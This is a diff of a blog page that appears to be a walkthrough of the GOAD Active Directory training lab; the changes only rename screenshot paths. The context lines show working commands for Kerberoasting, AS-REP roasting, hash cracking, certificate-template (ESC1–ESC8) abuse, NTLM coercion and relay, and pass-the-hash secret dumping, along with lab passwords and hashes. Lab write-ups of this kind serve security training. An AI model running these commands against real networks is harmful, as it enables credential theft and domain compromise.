@@ -772,14 +772,14 @@ impacket-secretsdump<span class="w"> </span>-k<span class="w"> </span>-no-pass<s
 <p>User <code>NORTH\jon.snow</code>'s password is <code>iknownothing</code>.</p>
 <h4 id="targeted-kerberoast">Targeted Kerberoast</h4>
 <p>Enumerating <code>missandei</code> rights with <code>BloodHound</code>, it's noticed that this account has <code>GenericAll</code> permissions on <code>khal.drogo</code>; this allows to perform a targeted kerberoast attack against this user.</p>
-<p><img alt="Pasted image 20250223180440.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223180440.png"/></p>
+<p><img alt="essos-targetedkerberoast-enum.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-targetedkerberoast-enum.png"/></p>
 <div class="highlight"><pre><span></span><code>targetedKerberoast.py<span class="w"> </span>-v<span class="w"> </span>-d<span class="w"> </span><span class="s1">'essos.local'</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">'missandei'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'fr3edom'</span>
 </code></pre></div>
-<p><img alt="Pasted image 20250223180557.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223180557.png"/></p>
+<p><img alt="essos-targetedkerberoast.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-targetedkerberoast.png"/></p>
 <p>Cracking <code>khal.drogo</code> TGS:</p>
 <div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>khaldogo.targetedkerberoasting<span class="w"> </span>/usr/share/wordlists/rockyou.txt
 </code></pre></div>
-<p><img alt="Pasted image 20250223180634.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223180634.png"/></p>
+<p><img alt="essos-targetedkerberoast-crack.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-targetedkerberoast-crack.png"/></p>
 <p>Password for <code>khal.drogo</code> is <code>horse</code>.</p>
 <h2 id="as-rep-roasting_1">AS-REP Roasting</h2>
 <h3 id="northsevenkingdomslocal">NORTH.SEVENKINGDOMS.LOCAL</h3>
@@ -800,15 +800,15 @@ impacket-secretsdump<span class="w"> </span>-k<span class="w"> </span>-no-pass<s
 <p>Find AS-REP-roastable users on <code>essos.local</code> abusing trust with <code>sevenkingdoms</code>:</p>
 <div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>essos.local<span class="w"> </span>-d<span class="w"> </span>SEVENKINGDOMS.local<span class="w"> </span>-u<span class="w"> </span>cersei.lannister<span class="w"> </span>-p<span class="w"> </span>il0vejaime<span class="w"> </span>--query<span class="w"> </span><span class="s2">"(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"</span><span class="w"> </span><span class="s2">"samaccountname"</span>
 </code></pre></div>
-<p><img alt="Pasted image 20250223175436.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223175436.png"/></p>
+<p><img alt="essos-asreproast-enum.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-asreproast-enum.png"/></p>
 <p>Request TGS for <code>missandei</code> using Impacket's <code>GetNPUsers</code> anonymously:</p>
 <div class="highlight"><pre><span></span><code>impacket-GetNPUsers<span class="w"> </span>-no-pass<span class="w"> </span>essos.local/missandei
 </code></pre></div>
-<p><img alt="Pasted image 20250223175630.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223175630.png"/></p>
+<p><img alt="essos-asreproast.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-asreproast.png"/></p>
 <p>Crack the TGS with <code>hashcat</code>:</p>
 <div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>missandei.asreproast<span class="w"> </span>/usr/share/wordlists/rockyou.txt
 </code></pre></div>
-<p><img alt="Pasted image 20250223175712.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223175712.png"/></p>
+<p><img alt="essos-asreproast-crack.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-asreproast-crack.png"/></p>
 <p>Password for <code>missandei</code> account is <code>fr3edom</code>.</p>
 <h2 id="unconstrained-delegation_1">Unconstrained Delegation</h2>
 <p>Enumerate vulnerable computers:</p>
@@ -985,73 +985,73 @@ impacket-psexec<span class="w"> </span>-k<span class="w"> </span>-no-pass<span c
 </code></pre></div>
 <h3 id="esc1">ESC1</h3>
 <p>The template <code>ESC1</code> is found to be vulnerable to <strong>ESC1</strong> abuse.</p>
-<p><img alt="Pasted image 20250223182705.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223182705.png"/></p>
+<p><img alt="esoss-esc1-vuln-cert.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc1-vuln-cert.png"/></p>
 <p>Request a certificate specifying <code>Administrator</code> as altname:</p>
 <div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>khal.drogo<span class="w"> </span>-p<span class="w"> </span>horse<span class="w"> </span>-ca<span class="w"> </span>ESSOS-CA<span class="w"> </span>-target<span class="w"> </span>braavos.essos.local<span class="w"> </span>-template<span class="w"> </span>ESC1<span class="w"> </span>-upn<span class="w"> </span>administrator@essos.local
 </code></pre></div>
-<p><img alt="Pasted image 20250223181409.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223181409.png"/></p>
+<p><img alt="essos-esc1-req.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-esc1-req.png"/></p>
 <p>Obtain TGT and NTLM hash for <code>Administrator</code> using the certificate:</p>
 <div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12
 </code></pre></div>
-<p><img alt="Pasted image 20250223181457.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223181457.png"/></p>
+<p><img alt="essos-esc1-auth.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-esc1-auth.png"/></p>
 <p>Dump secrets passing the obtained hash on <code>braavos.essos.local</code>:</p>
 <div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:b1794c0bfede743de3a1c22425c2c5e1<span class="w"> </span>essos.local/administrator@braavos.essos.local
 </code></pre></div>
-<p><img alt="Pasted image 20250223182017.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223182017.png"/></p>
+<p><img alt="essos-esc1-pth-braavos.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-esc1-pth-braavos.png"/></p>
 <p><code>sql_svc</code> password is leaked: <code>YouWillNotKerboroast1ngMeeeeee</code>.</p>
 <p>Dump secrets passing the obtained hash on <code>meeren.essos.local</code>:</p>
 <div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:b1794c0bfede743de3a1c22425c2c5e1<span class="w"> </span>administrator@essos.local
 </code></pre></div>
-<p><img alt="Pasted image 20250223181726.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223181726.png"/></p>
+<p><img alt="essos-esc1-pth-meeren.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-esc1-pth-meeren.png"/></p>
 <h3 id="esc2-esc3">ESC2 + ESC3</h3>
 <p>Templates <code>ESC3-CRA</code> and <code>ESC3</code> are found to be vulnerable to <strong>ESC3</strong> abuse.</p>
-<p><img alt="Pasted image 20250223183602.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223183602.png"/></p>
-<p><img alt="Pasted image 20250223185332.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223185332.png"/></p>
+<p><img alt="esoss-esc3-vuln-cert.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc3-vuln-cert.png"/></p>
+<p><img alt="esoss-esc3-vuln-cert2.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc3-vuln-cert2.png"/></p>
 <p>Request a certificate to the enrolling agent:</p>
 <div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-username<span class="w"> </span>khal.drogo<span class="w"> </span>-password<span class="w"> </span>horse<span class="w"> </span>-ca<span class="w"> </span>ESSOS-CA<span class="w"> </span>-target<span class="w"> </span>braavos.essos.local<span class="w"> </span>-template<span class="w"> </span>ESC3-CRA
 </code></pre></div>
-<p><img alt="Pasted image 20250223183939.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223183939.png"/></p>
+<p><img alt="esoss-esc3-req1.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc3-req1.png"/></p>
 <p>Request a certificate on behalf of <code>Administrator</code> using the enrolling agent provided certificate:</p>
 <div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-username<span class="w"> </span>khal.drogo<span class="w"> </span>-password<span class="w"> </span>horse<span class="w"> </span>-ca<span class="w"> </span>ESSOS-CA<span class="w"> </span>-target<span class="w"> </span>braavos.essos.local<span class="w"> </span>-template<span class="w"> </span>ESC3<span class="w"> </span>-on-behalf-of<span class="w"> </span><span class="s1">'essos\Administrator'</span><span class="w"> </span>-pfx<span class="w"> </span>khal.drogo.pfx
 </code></pre></div>
-<p><img alt="Pasted image 20250223185131.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223185131.png"/></p>
+<p><img alt="esoss-esc3-req2.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc3-req2.png"/></p>
 <p>Authenticate as <code>Administrator</code> to the DC:</p>
 <div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12
 </code></pre></div>
-<p><img alt="Pasted image 20250223185719.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223185719.png"/></p>
+<p><img alt="esoss-esc3-auth.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc3-auth.png"/></p>
 <p>Template <code>ESC2</code> is also suitable for <strong>ESC3</strong> abuse since has the <strong>Enrollment Agent</strong> setting set to true.</p>
-<p><img alt="Pasted image 20250223183504.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223183504.png"/></p>
+<p><img alt="esoss-esc2-vuln-cert.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc2-vuln-cert.png"/></p>
 <h3 id="esc4">ESC4</h3>
 <p>The template <code>ESC4</code> is found to be vulnerable to <strong>ESC4</strong> abuse.</p>
-<p><img alt="Pasted image 20250223190410.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223190410.png"/></p>
+<p><img alt="esoss-esc4-vuln-cert.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc4-vuln-cert.png"/></p>
 <p>Abuse <code>khal.drogo</code> overly permissive rights on the certificate template making it vulnerable to <strong>ESC1</strong>:</p>
 <div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>template<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12<span class="w">&nbsp;</span>-username<span class="w"> </span>khal.drogo<span class="w"> </span>-password<span class="w"> </span>horse<span class="w"> </span>-template<span class="w"> </span>ESC4<span class="w"> </span>-save-old
 </code></pre></div>
-<p><img alt="Pasted image 20250223190544.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223190544.png"/></p>
+<p><img alt="esoss-esc4-edit-template.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc4-edit-template.png"/></p>
 <p>Recheck the template:</p>
 <div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>find<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12<span class="w"> </span>-u<span class="w"> </span>khal.drogo@essos.local<span class="w"> </span>-p<span class="w"> </span>horse<span class="w"> </span>-stdout<span class="w"> </span>-vulnerable
 </code></pre></div>
-<p><img alt="Pasted image 20250223190651.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223190651.png"/></p>
+<p><img alt="esoss-esc4-result.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc4-result.png"/></p>
 <p>Restore the template to its original configuration:</p>
 <div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>template<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.1.0.12<span class="w"> &nbsp;</span>-username<span class="w"> </span>khal.drogo<span class="w"> </span>-password<span class="w"> </span>horse<span class="w"> </span>-template<span class="w"> </span>ESC4<span class="w"> </span>-configuration<span class="w"> </span>ESC4.json
 </code></pre></div>
-<p><img alt="Pasted image 20250223190801.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223190801.png"/></p>
+<p><img alt="esoss-esc4-restore-template.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc4-restore-template.png"/></p>
 <h3 id="esc6">ESC6</h3>
-<p><img alt="Pasted image 20250223190946.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223190946.png"/></p>
+<p><img alt="esoss-esc6-vuln-ca.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc6-vuln-ca.png"/></p>
 <p>Even though the flag <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> appears to be set, the server seems to be patched agaist this attack.</p>
 <h3 id="esc8">ESC8</h3>
-<p><img alt="Pasted image 20250223200225.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223200225.png"/></p>
+<p><img alt="esoss-esc8-vuln-ca.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc8-vuln-ca.png"/></p>
 <div class="highlight"><pre><span></span><code>coercer<span class="w"> </span>coerce<span class="w"> </span>-u<span class="w"> </span>khal.drogo<span class="w"> </span>-d<span class="w"> </span>essos.local<span class="w"> </span>-p<span class="w"> </span>horse<span class="w"> </span>-t<span class="w"> </span>essos.local<span class="w"> </span>-l<span class="w"> </span><span class="m">10</span>.1.0.4
 </code></pre></div>
 <div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>relay<span class="w"> </span>-target<span class="w"> </span><span class="s1">'http://braavos.essos.local'</span><span class="w"> </span>-template<span class="w"> </span>DomainController
 </code></pre></div>
-<p><img alt="Pasted image 20250223195948.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223195948.png"/></p>
+<p><img alt="esoss-esc8-coerce-ntlm-relay.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc8-coerce-ntlm-relay.png"/></p>
 <div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:2ed16485d41a887f04791d626e77efef<span class="w"> </span><span class="s1">'ESSOS/MEEREEN$'</span>@essos.local
 </code></pre></div>
-<p><img alt="Pasted image 20250223200005.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223200005.png"/></p>
+<p><img alt="esoss-esc8-pth.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc8-pth.png"/></p>
 <div class="highlight"><pre><span></span><code>impacket-ntlmrelayx<span class="w"> </span>-t<span class="w"> </span><span class="s1">'http://braavos.essos.local/certsrv/certfnsh.asp'</span><span class="w"> </span>--adcs<span class="w"> </span>--template<span class="w"> </span>DomainController<span class="w"> </span>-l<span class="w"> </span>dumps
 </code></pre></div>
-<p><img alt="Pasted image 20250223200949.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250223200949.png"/></p>
+<p><img alt="esoss-esc8-ntlmrelayx.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/esoss-esc8-ntlmrelayx.png"/></p>
   </div>
   <div class="tag-cloud">
     <p>
